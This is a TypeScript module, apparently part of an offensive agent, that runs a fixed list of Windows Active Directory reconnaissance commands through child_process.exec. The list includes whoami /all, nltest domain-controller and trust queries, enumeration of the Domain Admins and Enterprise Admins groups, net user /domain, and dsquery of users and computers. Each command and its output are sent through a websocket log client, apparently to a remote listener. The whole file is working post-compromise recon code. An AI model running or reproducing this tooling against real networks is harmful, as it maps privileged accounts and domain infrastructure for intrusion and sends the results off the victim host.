import { exec } from 'child_process';
import sendLog from './websocket/client';

const executeCommand = (command: string): Promise<string> => {
  return new Promise((resolve, reject) => {
    exec(command, (error, stdout, stderr) => {
      if (error) {
        reject(`Erro ao executar "${command}": ${error.message}`);
        return;
      }
      if (stderr) {
        reject(`Erro (stderr) ao executar "${command}": ${stderr}`);
        return;
      }
      resolve(stdout.trim());
    });
  });
};

const enumerateAD = async () => {
  const commands = [
    'whoami /all',
    'nltest /dsgetdc:.',
    'echo %LOGONSERVER%',
    'hostname',
    'systeminfo',
    'nltest /dclist:.',
    'nltest /domain_trusts',
    'net view /domain',
    'net group /domain',
    'net localgroup',
    'net group "Domain Admins" /domain',
    'net group "Enterprise Admins" /domain',
    'net group "Administrators" /domain',
    'net user /domain',
    'net view \\\\%LOGONSERVER%',
    'net share',
    'net accounts /domain',
    'net session',
    'net use',
    'dsquery group -limit 50',
    'dsquery user -limit 50',
    'dsquery computer -limit 50',
  ];

  for (const command of commands) {
    try {
      setTimeout(() => sendLog(`[+] -> COMANDOS EXECUTADOS: ${command}`), 1000);
      const output = await executeCommand(command);
      setTimeout(() => sendLog(`[+] -> SAÍDA: ${output}`), 1000);
    } catch (err) {
      setTimeout(() => sendLog(`[+] -> ERRO AO EXECUTAR: ${err}`), 1000);
    }
  }
};

export default enumerateAD;
